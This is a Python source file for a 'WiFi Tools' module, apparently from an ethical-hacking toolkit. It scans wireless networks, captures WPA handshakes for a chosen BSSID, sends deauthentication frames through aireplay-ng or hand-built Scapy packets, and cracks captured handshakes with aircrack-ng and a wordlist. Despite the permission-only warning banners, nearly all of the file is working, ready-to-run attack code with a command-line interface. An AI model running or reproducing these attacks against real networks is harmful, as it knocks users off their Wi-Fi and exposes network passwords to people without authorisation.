#!/usr/bin/env python3
"""
WiFi Tools - Ethical Hacking Tools Suite
Educational and Testing Purposes Only

WiFi security testing tools including:
- Network scanning
- WPA handshake capture
- Deauthentication attacks
- WPS PIN attacks
- Hidden network detection
"""

import os
import sys
import time
import subprocess
import threading
import argparse
from datetime import datetime
import json
import re

try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Warning: Scapy not available. Some WiFi features disabled.")

from ethical_hacking_tools.utils.logger import setup_logger, log_security_event

class WiFiTools:
    """
    WiFi security testing tools
    """
    
    def __init__(self):
        self.logger = setup_logger('wifi_tools')
        self.networks = []
        self.target_network = None
        self.is_running = False
        
        # Check for required tools
        self.aircrack_available = self.check_tool('aircrack-ng')
        self.aireplay_available = self.check_tool('aireplay-ng')
        self.airodump_available = self.check_tool('airodump-ng')
        self.airmon_available = self.check_tool('airmon-ng')
        
        print("[!] WARNING: WiFi testing is for educational purposes only!")
        print("[!] Use only on networks you own or have explicit permission to test!")
        print("[!] Unauthorized WiFi testing may violate laws and regulations!")
        print(f"[!] Required tools status:")
        print(f"    aircrack-ng: {'Available' if self.aircrack_available else 'Not available'}")
        print(f"    aireplay-ng: {'Available' if self.aireplay_available else 'Not available'}")
        print(f"    airodump-ng: {'Available' if self.airodump_available else 'Not available'}")
        print(f"    airmon-ng: {'Available' if self.airmon_available else 'Not available'}")
    
    def check_tool(self, tool_name):
        """
        Check if a tool is available in the system
        """
        try:
            subprocess.run([tool_name, '--help'], 
                         capture_output=True, 
                         timeout=5)
            return True
        except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.CalledProcessError):
            return False
    
    def get_wireless_interfaces(self):
        """
        Get list of wireless interfaces
        """
        interfaces = []
        
        try:
            # Try to get interfaces using iwconfig
            result = subprocess.run(['iwconfig'], 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=10)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'IEEE 802.11' in line:
                        interface = line.split()[0]
                        interfaces.append(interface)
            
            # Fallback to common interface names
            if not interfaces:
                common_interfaces = ['wlan0', 'wlan1', 'wlp2s0', 'wlp3s0', 'wifi0']
                for interface in common_interfaces:
                    try:
                        subprocess.run(['iwconfig', interface], 
                                     capture_output=True, 
                                     timeout=5)
                        interfaces.append(interface)
                    except:
                        continue
        
        except Exception as e:
            self.logger.error(f"Error getting wireless interfaces: {e}")
        
        return interfaces
    
    def scan_networks(self, interface=None, duration=30):
        """
        Scan for available WiFi networks
        """
        self.logger.info(f"Starting WiFi network scan")
        print(f"\n[+] Scanning for WiFi networks...")
        
        if not interface:
            interfaces = self.get_wireless_interfaces()
            if not interfaces:
                print("[!] Error: No wireless interfaces found")
                return []
            interface = interfaces[0]
        
        print(f"[+] Using interface: {interface}")
        print(f"[+] Scan duration: {duration} seconds")
        
        networks = []
        
        try:
            if self.airodump_available:
                # Use airodump-ng for scanning
                networks = self.scan_with_airodump(interface, duration)
            elif SCAPY_AVAILABLE:
                # Use scapy for basic scanning
                networks = self.scan_with_scapy(interface, duration)
            else:
                print("[!] Error: No scanning tools available")
                return []
            
            # Display results
            if networks:
                print(f"\n[+] Found {len(networks)} networks:")
                print("-" * 80)
                print(f"{'BSSID':<17} {'ESSID':<20} {'Channel':<8} {'Signal':<8} {'Encryption':<15}")
                print("-" * 80)
                
                for network in networks:
                    bssid = network.get('bssid', 'Unknown')
                    essid = network.get('essid', 'Hidden')
                    channel = network.get('channel', 'Unknown')
                    signal = network.get('signal', 'Unknown')
                    encryption = network.get('encryption', 'Unknown')
                    
                    print(f"{bssid:<17} {essid:<20} {channel:<8} {signal:<8} {encryption:<15}")
                
                print("-" * 80)
            else:
                print("[!] No networks found")
            
            return networks
        
        except Exception as e:
            self.logger.error(f"Error scanning networks: {e}")
            print(f"[!] Error: {e}")
            return []
    
    def scan_with_airodump(self, interface, duration):
        """
        Scan using airodump-ng
        """
        networks = []
        
        try:
            # Start airodump-ng
            cmd = ['airodump-ng', interface, '--write', 'scan_output', '--output-format', 'csv']
            process = subprocess.Popen(cmd, 
                                    stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE,
                                    text=True)
            
            # Wait for duration
            time.sleep(duration)
            
            # Terminate process
            process.terminate()
            process.wait()
            
            # Parse CSV output
            csv_file = 'scan_output-01.csv'
            if os.path.exists(csv_file):
                networks = self.parse_airodump_csv(csv_file)
                os.remove(csv_file)  # Clean up
        
        except Exception as e:
            self.logger.error(f"Error with airodump-ng: {e}")
        
        return networks
    
    def parse_airodump_csv(self, csv_file):
        """
        Parse airodump-ng CSV output
        """
        networks = []
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # Find the start of network data
            start_index = 0
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'ESSID' in line:
                    start_index = i + 1
                    break
            
            # Parse network data
            for line in lines[start_index:]:
                if line.strip() == '':
                    break
                
                parts = line.strip().split(',')
                if len(parts) >= 6:
                    network = {
                        'bssid': parts[0].strip(),
                        'first_seen': parts[1].strip(),
                        'last_seen': parts[2].strip(),
                        'channel': parts[3].strip(),
                        'speed': parts[4].strip(),
                        'privacy': parts[5].strip(),
                        'cipher': parts[6].strip() if len(parts) > 6 else '',
                        'auth': parts[7].strip() if len(parts) > 7 else '',
                        'power': parts[8].strip() if len(parts) > 8 else '',
                        'beacons': parts[9].strip() if len(parts) > 9 else '',
                        'iv': parts[10].strip() if len(parts) > 10 else '',
                        'lan_ip': parts[11].strip() if len(parts) > 11 else '',
                        'id_length': parts[12].strip() if len(parts) > 12 else '',
                        'essid': parts[13].strip() if len(parts) > 13 else 'Hidden',
                        'key': parts[14].strip() if len(parts) > 14 else ''
                    }
                    
                    # Determine encryption type
                    if 'WPA2' in network['privacy']:
                        network['encryption'] = 'WPA2'
                    elif 'WPA' in network['privacy']:
                        network['encryption'] = 'WPA'
                    elif 'WEP' in network['privacy']:
                        network['encryption'] = 'WEP'
                    else:
                        network['encryption'] = 'Open'
                    
                    networks.append(network)
        
        except Exception as e:
            self.logger.error(f"Error parsing airodump CSV: {e}")
        
        return networks
    
    def scan_with_scapy(self, interface, duration):
        """
        Basic network scanning using scapy
        """
        networks = []
        
        try:
            print("[+] Using scapy for basic scanning...")
            
            # Set interface to monitor mode
            self.set_monitor_mode(interface)
            
            # Start sniffing
            def packet_handler(packet):
                if packet.haslayer(Dot11Beacon):
                    bssid = packet[Dot11].addr3
                    essid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
                    
                    # Check if network already exists
                    existing = next((n for n in networks if n['bssid'] == bssid), None)
                    if not existing:
                        network = {
                            'bssid': bssid,
                            'essid': essid if essid else 'Hidden',
                            'channel': 'Unknown',
                            'signal': 'Unknown',
                            'encryption': 'Unknown'
                        }
                        networks.append(network)
            
            sniff(iface=interface, 
                  prn=packet_handler, 
                  timeout=duration,
                  store=0)
        
        except Exception as e:
            self.logger.error(f"Error with scapy scanning: {e}")
        
        return networks
    
    def set_monitor_mode(self, interface):
        """
        Set interface to monitor mode
        """
        try:
            if self.airmon_available:
                # Use airmon-ng
                subprocess.run(['airmon-ng', 'start', interface], 
                             capture_output=True, 
                             timeout=10)
            else:
                # Manual method
                subprocess.run(['ifconfig', interface, 'down'], 
                             capture_output=True, 
                             timeout=5)
                subprocess.run(['iwconfig', interface, 'mode', 'monitor'], 
                             capture_output=True, 
                             timeout=5)
                subprocess.run(['ifconfig', interface, 'up'], 
                             capture_output=True, 
                             timeout=5)
        
        except Exception as e:
            self.logger.error(f"Error setting monitor mode: {e}")
    
    def capture_handshake(self, target_bssid, target_channel, interface, duration=60):
        """
        Capture WPA handshake
        """
        self.logger.info(f"Capturing handshake for {target_bssid}")
        print(f"\n[+] Capturing WPA handshake for {target_bssid}")
        print(f"[+] Channel: {target_channel}")
        print(f"[+] Interface: {interface}")
        print(f"[+] Duration: {duration} seconds")
        
        try:
            if not self.airodump_available:
                print("[!] Error: airodump-ng not available")
                return False
            
            # Start airodump-ng to capture handshake
            cmd = [
                'airodump-ng',
                '--bssid', target_bssid,
                '--channel', str(target_channel),
                '--write', 'handshake_capture',
                interface
            ]
            
            process = subprocess.Popen(cmd, 
                                    stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE,
                                    text=True)
            
            print(f"[+] Capturing handshake... (Press Ctrl+C to stop)")
            
            # Monitor for handshake capture
            start_time = time.time()
            while time.time() - start_time < duration:
                time.sleep(5)
                
                # Check if handshake was captured
                cap_file = 'handshake_capture-01.cap'
                if os.path.exists(cap_file):
                    # Check if file contains handshake
                    if self.check_handshake_captured(cap_file):
                        print(f"[+] WPA handshake captured!")
                        process.terminate()
                        process.wait()
                        
                        log_security_event(
                            self.logger,
                            'wpa_handshake_captured',
                            target_bssid,
                            f"Channel: {target_channel}"
                        )
                        
                        return True
            
            process.terminate()
            process.wait()
            
            print(f"[!] Handshake capture timeout")
            return False
        
        except KeyboardInterrupt:
            print(f"\n[!] Handshake capture interrupted")
            return False
        except Exception as e:
            self.logger.error(f"Error capturing handshake: {e}")
            print(f"[!] Error: {e}")
            return False
    
    def check_handshake_captured(self, cap_file):
        """
        Check if handshake was captured in cap file
        """
        try:
            if self.aircrack_available:
                result = subprocess.run(['aircrack-ng', cap_file], 
                                      capture_output=True, 
                                      text=True, 
                                      timeout=10)
                return 'WPA (1 handshake)' in result.stdout
            else:
                # Basic file size check
                return os.path.getsize(cap_file) > 1000
        except:
            return False
    
    def deauth_attack(self, target_bssid, target_client=None, interface=None, count=10):
        """
        Perform deauthentication attack
        """
        self.logger.info(f"Starting deauth attack on {target_bssid}")
        print(f"\n[+] Starting deauthentication attack...")
        print(f"[+] Target BSSID: {target_bssid}")
        if target_client:
            print(f"[+] Target Client: {target_client}")
        print(f"[+] Interface: {interface}")
        print(f"[+] Packets: {count}")
        
        try:
            if self.aireplay_available:
                # Use aireplay-ng
                cmd = ['aireplay-ng', '--deauth', str(count)]
                if target_client:
                    cmd.extend(['--deauth', str(count), '-c', target_client])
                cmd.extend(['-a', target_bssid, interface])
                
                result = subprocess.run(cmd, 
                                     capture_output=True, 
                                     text=True, 
                                     timeout=30)
                
                if result.returncode == 0:
                    print(f"[+] Deauthentication attack completed")
                    
                    log_security_event(
                        self.logger,
                        'deauth_attack',
                        target_bssid,
                        f"Packets: {count}, Client: {target_client or 'All'}"
                    )
                    
                    return True
                else:
                    print(f"[!] Deauthentication attack failed")
                    return False
            
            elif SCAPY_AVAILABLE:
                # Use scapy for deauth attack
                return self.deauth_with_scapy(target_bssid, target_client, count)
            
            else:
                print("[!] Error: No deauth tools available")
                return False
        
        except Exception as e:
            self.logger.error(f"Error in deauth attack: {e}")
            print(f"[!] Error: {e}")
            return False
    
    def deauth_with_scapy(self, target_bssid, target_client, count):
        """
        Deauthentication attack using scapy
        """
        try:
            print("[+] Using scapy for deauth attack...")
            
            # Create deauth packet
            if target_client:
                packet = RadioTap() / Dot11(
                    type=0, subtype=12, addr1=target_client, addr2=target_bssid, addr3=target_bssid
                ) / Dot11Deauth(reason=7)
            else:
                packet = RadioTap() / Dot11(
                    type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid
                ) / Dot11Deauth(reason=7)
            
            # Send packets
            sendp(packet, count=count, verbose=1)
            
            print(f"[+] Deauthentication attack completed")
            return True
        
        except Exception as e:
            self.logger.error(f"Error with scapy deauth: {e}")
            return False
    
    def crack_wpa_handshake(self, cap_file, wordlist_file):
        """
        Crack WPA handshake using wordlist
        """
        self.logger.info(f"Cracking WPA handshake with {wordlist_file}")
        print(f"\n[+] Cracking WPA handshake...")
        print(f"[+] Cap file: {cap_file}")
        print(f"[+] Wordlist: {wordlist_file}")
        
        try:
            if not self.aircrack_available:
                print("[!] Error: aircrack-ng not available")
                return False
            
            if not os.path.exists(cap_file):
                print(f"[!] Error: Cap file '{cap_file}' not found")
                return False
            
            if not os.path.exists(wordlist_file):
                print(f"[!] Error: Wordlist file '{wordlist_file}' not found")
                return False
            
            # Start aircrack-ng
            cmd = ['aircrack-ng', '-w', wordlist_file, cap_file]
            
            print(f"[+] Starting password cracking...")
            print(f"[+] This may take a while...")
            
            process = subprocess.Popen(cmd, 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE,
                                     text=True)
            
            # Monitor output
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                
                if output:
                    print(output.strip())
                    
                    # Check if password was found
                    if 'KEY FOUND!' in output:
                        print(f"[+] Password found!")
                        process.terminate()
                        process.wait()
                        
                        log_security_event(
                            self.logger,
                            'wpa_password_cracked',
                            cap_file,
                            'Password found in wordlist'
                        )
                        
                        return True
            
            process.wait()
            
            if process.returncode == 0:
                print(f"[+] Password found!")
                return True
            else:
                print(f"[!] Password not found in wordlist")
                return False
        
        except Exception as e:
            self.logger.error(f"Error cracking handshake: {e}")
            print(f"[!] Error: {e}")
            return False
    
    def scan(self, interface=None, duration=30):
        """
        Main scanning function
        """
        print(f"\n{'='*60}")
        print("WIFI TOOLS - ETHICAL HACKING TOOLS")
        print(f"{'='*60}")
        print(f"[!] WARNING: Use only on networks you own or have permission to test!")
        print(f"[!] Educational and testing purposes only!")
        
        networks = self.scan_networks(interface, duration)
        
        if networks:
            print(f"\n[+] Scan completed. Found {len(networks)} networks.")
            
            # Log results
            network_bssids = [n['bssid'] for n in networks]
            log_security_event(
                self.logger,
                'wifi_scan_completed',
                'network',
                f"Networks found: {len(networks)}"
            )
        
        return networks

def main():
    """
    Command line interface for WiFi Tools
    """
    parser = argparse.ArgumentParser(description='WiFi Tools - Ethical Hacking Tools')
    parser.add_argument('-i', '--interface', help='Wireless interface')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Scan duration in seconds')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan for networks')
    parser.add_argument('-c', '--capture', help='Capture handshake for BSSID')
    parser.add_argument('--channel', type=int, help='Channel for handshake capture')
    parser.add_argument('--deauth', help='Deauth attack on BSSID')
    parser.add_argument('--client', help='Target client MAC for deauth')
    parser.add_argument('--count', type=int, default=10, help='Number of deauth packets')
    parser.add_argument('--crack', help='Crack handshake cap file')
    parser.add_argument('--wordlist', help='Wordlist for cracking')
    
    args = parser.parse_args()
    
    wifi = WiFiTools()
    
    if args.scan:
        wifi.scan(args.interface, args.duration)
    elif args.capture and args.channel:
        wifi.capture_handshake(args.capture, args.channel, args.interface)
    elif args.deauth:
        wifi.deauth_attack(args.deauth, args.client, args.interface, args.count)
    elif args.crack and args.wordlist:
        wifi.crack_wpa_handshake(args.crack, args.wordlist)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
